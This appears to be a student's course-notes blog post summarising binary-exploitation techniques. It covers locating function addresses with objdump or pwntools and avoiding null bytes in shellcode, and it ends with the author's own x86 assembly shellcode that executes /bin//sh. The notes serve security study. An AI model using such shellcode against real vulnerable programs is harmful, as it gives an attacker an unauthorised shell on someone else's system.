---
layout: post
categories: Week06
---

## Mid-Sem Summary

**Finding Function Locations**
* For non-PIE binaries, can get address of functions using `objdump`.

```bash
objdump -t bunary | grep func
```

or alternatively, with pwntools: 

```python
p.elf.symbols["func"]
```

**Avoid Null-bytes in Shellcode**
* Instead of `mov eax, SYS_execve`, use `mov al, SYS_execve` (there iwll be no null padding)
* pwntools `shellcraft` tries to avoid nulls and newlines (however can be long)
* Sometimes payload needs to be only ASCII

_My Shellcode_ (created post-exam)

```asm
    xor eax, eax
    push eax        
    push 0x68732f2f  
    push 0x6e69622f  
    mov ebx, esp 
    push eax 

    push SYS_execve
    pop eax
    xor ecx, ecx
    xor edx, edx

    int 0x80
```